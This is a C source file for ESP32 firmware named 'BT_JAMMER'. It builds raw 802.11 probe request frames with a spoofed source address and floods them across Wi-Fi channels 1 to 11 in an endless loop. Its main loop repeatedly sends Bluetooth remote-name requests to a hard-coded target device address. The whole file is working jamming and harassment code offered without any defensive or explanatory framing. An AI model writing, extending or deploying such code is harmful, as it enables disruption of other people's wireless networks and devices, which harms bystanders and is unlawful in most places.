#include <stdio.h>
#include <string.h>
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BT_JAMMER";

static esp_bd_addr_t target_device = {0xf4, 0x4e, 0xfd, 0x03, 0xa6, 0xdc};

static void esp_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    switch (event) {
        case ESP_BT_GAP_READ_REMOTE_NAME_EVT:
            if (param->read_rmt_name.stat == ESP_BT_STATUS_SUCCESS) {
                ESP_LOGI(TAG, "Remote device name: %s", param->read_rmt_name.rmt_name);
            } else {
                ESP_LOGI(TAG, "Failed to read remote name");
            }
            break;
        default:
            break;
    }
}

// Enhanced Wi-Fi jamming task using probe request flooding
static void wifi_jammer_task(void *pvParameters) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t probe_frame[64] = {
        0x40, 0x00,                         // probe request frame control
        0x00, 0x00,                         // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // destination: broadcast
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // source: spoofed
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: broadcast
        0x00, 0x00,                         // sequence number
        0x00,                               // SSID tag number
        0x04,                               // SSID tag length
        'J', 'A', 'M', '!',                 // SSID content
        0x01, 0x08,                         // supported rates tag number + length
        0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c // 8 supported rates
    };

    while (true) {
        for (int channel = 1; channel <= 11; channel++) {
            esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            if (err != ESP_OK) {
                ESP_LOGE(TAG, "Failed to set Wi-Fi channel %d: %s", channel, esp_err_to_name(err));
                continue;
            }

            ESP_LOGI(TAG, "Flooding probe requests on channel %d", channel);
            for (int i = 0; i < 200; i++) {
                esp_wifi_80211_tx(WIFI_IF_AP, probe_frame, sizeof(probe_frame), false);
                vTaskDelay(1 / portTICK_PERIOD_MS);
            }
        }
    }
}

void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    bt_cfg.mode = ESP_BT_MODE_CLASSIC_BT;
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_bt_gap_register_callback(esp_gap_cb));
    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_NON_DISCOVERABLE));
    ESP_ERROR_CHECK(esp_bt_gap_set_device_name("BT_JAMMER"));

    xTaskCreate(wifi_jammer_task, "wifi_jammer", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "Starting Bluetooth probing...");
    while (1) {
        esp_bt_gap_read_remote_name(target_device);
        ESP_LOGI(TAG, "Sent remote name request to target device");
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }
}
